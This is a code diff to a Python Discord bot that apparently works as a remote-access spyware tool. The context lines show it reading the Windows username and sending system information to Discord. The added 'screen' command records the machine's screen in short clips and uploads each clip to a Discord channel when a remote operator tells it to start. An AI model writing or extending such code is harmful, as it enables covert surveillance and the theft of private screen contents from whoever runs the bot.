@@ -6,12 +6,16 @@ import platform
 import psutil
 import socket
 import uuid
+import pyautogui
+import imageio
+import numpy as np
+from datetime import datetime
 from discord.ext import commands
 
 # Setting const (a constant cant be changed in runtime)
-TOKEN = "BOT TOKEN" # Discord bot token
+TOKEN = "TOKEN" # Discord bot token
 USERNAME = os.getenv("USERNAME")  # Windows username
-GUILD_ID = "12345678"  # Replace with your actual server ID
+GUILD_ID = 12345678  # Replace with your actual server ID
 
 # Bot setup with proper intents (intents = the rights the discord bot has)
 intents = discord.Intents.default()
@@ -149,6 +153,88 @@ async def getsysinfo(ctx):
         await ctx.send(system_info)
     except Exception as e:
         return {"Error": f"Error getting system info: {e}"}
+    
+recording_task = None  # This will store the current recording task
+
+@bot.command()
+async def screen(ctx, action: str):
+    """Starts or stops screen recording."""
+    global recording_task  # To access the global task variable
+    rec = False
+
+    try:
+        if action.lower() == "start":
+            if recording_task is not None and not recording_task.done():
+                await ctx.send("❌ A recording is already in progress!")
+                return
+
+            # Start the recording task
+            rec = True
+            recording_task = asyncio.create_task(record_screen(ctx, rec))
+            await ctx.send("✅ Started the recording")
+
+        elif action.lower() == "stop":
+            if recording_task is None or recording_task.done():
+                await ctx.send("❌ No recording is currently in progress!")
+                return
+
+            # Stop the recording task by setting rec to False
+            rec = False
+            await ctx.send("✅ Stopping the recording")
+            recording_task.cancel()  # This will stop the recording task
+            await recording_task  # Wait for the task to finish properly
+
+        else:
+            await ctx.send("❌ Only use 'start' or 'stop'!")
+
+    except Exception as e:
+        await ctx.send(f"❌ Error: {str(e)}")
+
+
+async def record_screen(ctx, rec: bool):
+    """Handles the screen recording process."""
+    try:
+        # Define the output file name with a timestamp
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        output_file = f"screen_recording_{timestamp}.mp4"
+
+        # Record the screen continuously in a loop until rec is False
+        fps = 12  # Frames per second
+        duration = 3  # Duration in seconds
+        frames = []
+
+        while rec:  # Loop to keep recording as long as rec is True
+            frames.clear()  # Clear the frames list for the next batch of frames
+
+            for _ in range(fps * duration):
+                if not rec:
+                    break
+
+                screenshot = pyautogui.screenshot()
+                # Convert the screenshot to a numpy array
+                frame = np.array(screenshot)
+                frames.append(frame)
+                await asyncio.sleep(1 / fps)
+
+            if frames:
+                # Save frames as a video using imageio
+                with imageio.get_writer(output_file, fps=fps) as writer:
+                    for frame in frames:
+                        writer.append_data(frame)
+
+                # Send the recorded video to Discord
+                with open(output_file, "rb") as video_file:
+                    await ctx.send(file=discord.File(video_file, output_file))
+
+                # Optional: you can clean up the recorded file after sending it
+                os.remove(output_file)
+
+    except asyncio.CancelledError:
+        # Handle the task cancellation gracefully
+        await ctx.send("Recording was cancelled.")
+    except Exception as e:
+        await ctx.send(f"❌ Error recording screen: {str(e)}")
+
 
 @bot.event
 async def on_ready():
